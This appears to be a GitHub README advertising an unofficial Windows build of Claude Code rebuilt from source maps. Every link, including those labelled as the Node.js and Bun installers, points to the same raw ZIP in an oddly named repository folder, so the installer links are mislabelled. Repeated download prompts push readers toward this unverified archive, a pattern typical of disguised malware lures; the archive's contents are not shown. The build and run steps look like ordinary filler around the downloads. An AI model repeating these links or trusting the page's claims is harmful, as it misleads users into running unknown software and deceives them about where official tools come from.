# 🧩 claude-code-source-build - Run Claude Code from source on Windows

[![Download claude-code-source-build](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip)

## 📥 Download

Use this page to download and run the app:

[https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip](https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip)

## 🪟 What this app does

`claude-code-source-build` is a custom Windows build of Claude Code 2.1.88. It gives you a local CLI app that runs from a built bundle instead of a hosted installer.

This is useful if you want:

- A local command-line app
- A build made from source maps
- A package that keeps `@ant/*` source files in place
- A setup you can run from your own machine

## ✅ What you need

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- Node.js 20 or newer
- Bun 1.1 or newer
- npm

If you do not have these yet, install them first:

- Node.js: https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip
- Bun: https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip
- npm comes with Node.js

## 🚀 Get the files

1. Open the download page:
   https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip

2. Look for the latest release or build files.

3. Download the package for Windows.

4. Save the file to a folder you can find later, such as:
   - Downloads
   - Desktop
   - Documents

## 🛠️ Set up the app

1. Open File Explorer.

2. Go to the folder where you saved the download.

3. If the file is a ZIP file, right-click it and choose **Extract All**.

4. Open the extracted folder.

5. If the project uses source files only, open **Command Prompt** or **PowerShell** in that folder.

6. Make sure Node.js works by typing:

   `node -v`

7. Make sure Bun works by typing:

   `bun -v`

If both commands show version numbers, you are ready.

## ▶️ Build the app

If you are using the source build on your own PC, run this command in the project folder:

```bash
node scripts/build-cli.mjs
```

This makes a production build.

If you want a faster test build, use:

```bash
node scripts/build-cli.mjs --no-minify
```

If you want the output in a custom folder, use:

```bash
node scripts/build-cli.mjs --outfile /path/to/output/cli.js
```

## ⏳ First build behavior

The first build installs extra overlay packages with npm.

That first step can take a while because it pulls about 80 packages.

Later builds skip that step, so they finish faster.

## 📁 Output files

After the build finishes, you will see:

- `dist/cli.js` — the main wrapper file
- `dist/cli.bundle/` — the bundled app files

Keep both in the same place.

## 🏃 Run the app

To start the app, open Command Prompt or PowerShell in the project folder and run:

```bash
node dist/cli.js
```

This starts Claude Code from the built files.

## 🖥️ Computer Use on macOS

Computer use works in-process when the `CHICAGO_MCP` flag is on.

The app looks for native addons in:

- `prebuilds/` next to the bundled package
- paths set by environment variables

If the default path does not work, you can set the addon path yourself:

```bash
COMPUTER_USE_SWIFT_NODE_PATH="/path/to/compute"
```

You can also set other addon paths in the same way if the app asks for them.

## 🔧 Common fixes

### Node command does not work

If `node -v` fails:

1. Reinstall Node.js 20 or newer.
2. Close Command Prompt.
3. Open it again.
4. Try the command again.

### Bun command does not work

If `bun -v` fails:

1. Install Bun again.
2. Open a new terminal window.
3. Run the command again.

### Build stops during npm install

If the first build stops while installing packages:

1. Check your internet connection.
2. Wait a few minutes and try again.
3. Run the build command again in the same folder.

### App does not start

If `node dist/cli.js` does not start the app:

1. Make sure the build finished.
2. Check that `dist/cli.js` exists.
3. Make sure `dist/cli.bundle/` is present too.
4. Run the command again from the project folder.

## 📌 Folder layout

A typical project folder looks like this:

- `scripts/` — build scripts
- `dist/` — built output
- `dist/cli.js` — launch file
- `dist/cli.bundle/` — bundled files
- `prebuilds/` — native addon files

## 🧭 Basic use

After the app starts, you can work with it from the terminal.

Use it for tasks like:

- Reading and editing files
- Running project commands
- Working with source code
- Using local tools from the command line

## 🧩 Build modes

### Production mode

Use this when you want the final build:

```bash
node scripts/build-cli.mjs
```

This version uses minified output.

### Development mode

Use this when you want easier debugging:

```bash
node scripts/build-cli.mjs --no-minify
```

This version builds faster and keeps the output easier to inspect.

## 🔎 What the build keeps

This custom build keeps the real source for `@ant/*` packages. That helps when you need a build that stays close to the original source layout.

It also rebuilds the CLI from source maps, which makes the package easier to study and run from your machine.

## 🪄 If you want a clean rebuild

If you want to start fresh:

1. Delete the `dist/` folder.
2. Open a terminal in the project folder.
3. Run the build command again:

```bash
node scripts/build-cli.mjs
```

## 🧰 Useful commands

Check your Node version:

```bash
node -v
```

Check your Bun version:

```bash
bun -v
```

Build the app:

```bash
node scripts/build-cli.mjs
```

Run the app:

```bash
node dist/cli.js
```

## 📄 Files to keep

Keep these files together when you move the app:

- The built `dist/` folder
- The `prebuilds/` folder if you use computer use
- Any files you added for local setup

## 🪟 Windows path tip

If a command fails, make sure you are in the right folder.

A simple check:

```bash
cd
dir
```

If you do not see `scripts/` and `dist/`, you are in the wrong place.

## 🔐 Environment variables

Some native parts use environment variables to find files.

You can set them in PowerShell like this:

```powershell
$env:COMPUTER_USE_SWIFT_NODE_PATH="C:\path\to\compute"
```

If the app asks for another addon path, set it the same way.

## 🧪 Test after build

After the build finishes:

1. Open a terminal in the project folder.
2. Run `node dist/cli.js`.
3. Wait for the app to start.
4. Check that it opens without errors.

## 📦 Download again later

If you need the files again, use this page:

[https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip](https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip)